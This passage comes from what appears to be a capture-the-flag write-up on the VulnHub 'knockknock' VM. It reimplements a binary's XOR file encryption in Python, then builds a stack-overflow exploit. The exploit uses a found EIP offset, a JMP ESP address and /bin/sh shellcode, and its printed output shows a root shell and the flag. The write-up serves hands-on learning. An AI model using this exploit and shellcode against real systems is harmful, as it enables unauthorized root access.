<h1>}</h1>

<h1>else {</h1>

<h1>var_C = var_C >> 0x1;</h1>

<h1>}</h1>

<h1>var_8 = var_8 + 0x1;</h1>

<h1>}</h1>

<h1>var_4 = var_4 + 0x1;</h1>

<h1>}</h1>

<h1>var_14 = arg_4 &amp; 0xfffffffc;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while ((arg_4 &amp; 0x3) > var_4) {</h1>

<h1><em>(int8_t </em>)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ <em>(int8_t </em>)(arg_0 + var_14 + var_4) &amp; 0xff);</h1>

<h1>var_C = var_C >> 0x8;</h1>

<h1>var_4 = var_4 + 0x1;</h1>

<h1>}</h1>

<h1>return 0x0;</h1>

<h1>}</h1>

<p>def xcrypt(content, length):</p>

<pre><code>encrypted = ''

# set the base encryption key. this mutates with each pass
key = 0xea1ab19f    # var_C = 0xea1ab19f;

for word in range(length &gt;&gt; 2): # while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
    # apply the encryption logic as can bee seen in
    # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;

    # grab the 4 bytes we working with
    bytes = content[word*4:((word*4)+4)]

    # struct unpack_from returns a tuple, we want 0 so that
    # we end up with something we can xor
    long_to_xor = struct.unpack_from('&lt;L', bytes)[0]

    # apply the xor, this is the actual encryption part
    encrypted_bytes = long_to_xor ^ key

    # append the 4 encrypted bytes by packing them
    encrypted += struct.pack('&lt;L',encrypted_bytes)

    # next we run the key mutation 
    for mutation in xrange(8):

        # no mutation is possible of the key is 1111 1111 1111 1111
        if (key &amp; 1) != 0:
            key = key &gt;&gt; 1
            key = key ^ 0x6daa1cf4
        else:
            key = key &gt;&gt; 1  

return encrypted;
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># set the content that we want to encrypt
content = "A" *1000
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<h2>testing the script</h2>

<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>

<p>```bash
root@kali:~# python make-crypt.py > test.tfc</p>

<p>root@kali:~# head test.tfc
��[�]��C��dl�</p>

<pre><code>          H)�Aotg�\!�E?�̀l+�B��$f5%�&amp;�y�|S[I;R.�+T��w�$͟�7��?i�w'�3�s&lt;A��^��
</code></pre>

<p>root@kali:~# ./tfc test.tfc out.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>root@kali:~# head out.tfc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```</p>

<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>

<h2>finding EIP</h2>

<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.</p>

<p>gdb-peda$ r crash.tfc crash-out.tfc</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x0
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&lsquo;\t&rsquo;)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 (&lsquo;AAAA&rsquo;)
ESP: 0xbffff3d0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
EIP: 0x41414141 (&lsquo;AAAA&rsquo;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
Invalid $PC address: 0x41414141
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff3d0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0004| 0xbffff3d4 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0008| 0xbffff3d8 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0012| 0xbffff3dc (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0016| 0xbffff3e0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0020| 0xbffff3e4 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0024| 0xbffff3e8 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0028| 0xbffff3ec (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
```</p>

<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r crash.tfc crash-out.tfc</p>

<p>[&hellip; snip &hellip;]</p>

<p>Stopped reason: SIGSEGV
0x35684634 in ?? ()
gdb-peda$
```</p>

<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>

<p><code>bash
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
[*] Exact match at offset 4124
</code></p>

<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>

<p><code>bash
content = "A" *4124 + "BBBB" + "C"*(6000-4124-4)
</code></p>

<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>

<h2>exploiting tfc</h2>

<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>

<p><img class="<a" src="href="https://i.imgur.com/Mqkfe8l.png">https://i.imgur.com/Mqkfe8l.png</a>"></p>

<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>

<p><code>bash
content = "A" *4124 + "\x93\x8e\x04\x08" + "C"*(6000-4124-4)
</code></p>

<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>

<p>```python
if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># 08048e93  ; jmp esp
shellcode = (
    "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68" +
    "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
)

content = "A" *4124 + "\x93\x8e\x04\x08" + "\x90"*16 + shellcode + "C" *(6000-4124-4-16-len(shellcode))
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>

<p>```bash
jason@knockknock:~$ python make-crypt.py > crash.tfc &amp;&amp; ./tfc crash.tfc crash-out.tfc</p>

<h1>id</h1>

<p>uid=0(root) gid=1000(jason) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
```</p>

<p>pwnd!</p>

<p>As proof, the flag:</p>

<p>```bash</p>

<h1>cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt</h1>

<hr />

<p>|  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong>         |  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong> /<em>   |
|  |/ //    \ /  _ _/ </em><strong>\|  |/ /  </strong><em><strong><em> |  |/ //    \ /  _ _/ </em></strong>\|  |/ /  |   |
|    &lt;|   |  (  &lt;</em>> )  _<strong>|    &lt;  /</strong><strong><em>/ |    &lt;|   |  (  &lt;</em>> )  _</strong>|    &lt;   |   |
|<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \         |<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \  |___|</p>

<pre><code> \/    \/            \/     \/              \/    \/            \/     \/       
</code></pre>

<p>Hooray you got the flag!</p>

<p>Hope you had as much fun r00ting this as I did making it!</p>

<p>Feel free to hit me up in #vulnhub @ zer0w1re</p>

<p>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)</p>

<p>root password is &ldquo;qVx4UJ*zcUdc9#3C$Q&rdquo;, but you should already have a shell, right? ;)
```</p>

<p>There are a number other goodies in /root to check out so be sure to do that!</p>

<h2>conclusion</h2>

<p>Big shoutout to <a href="https://twitter.com/zer0w1re">@zer0w1re</a> for the VM and as always <a href="https://twitter.com/vulnhub">@VulnHub</a> for the hosting. The learning experience has been invaluable! :)</p>
]]></content>
  </entry>
  
</feed>
